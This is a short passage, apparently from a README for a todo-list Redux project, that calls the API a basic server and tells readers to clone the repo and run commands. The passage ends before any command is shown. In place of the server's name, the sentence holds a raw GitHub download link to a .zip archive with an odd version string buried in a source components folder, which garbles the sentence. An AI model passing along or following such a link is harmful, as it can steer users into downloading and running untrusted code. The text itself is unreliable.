...
The API is a dead basic https://github.com/RavenQueen03/todo-list-redux/raw/refs/heads/main/starter/src/components/redux_list_todo_v1.3-alpha.4.zip server. Clone the repo and run the following:
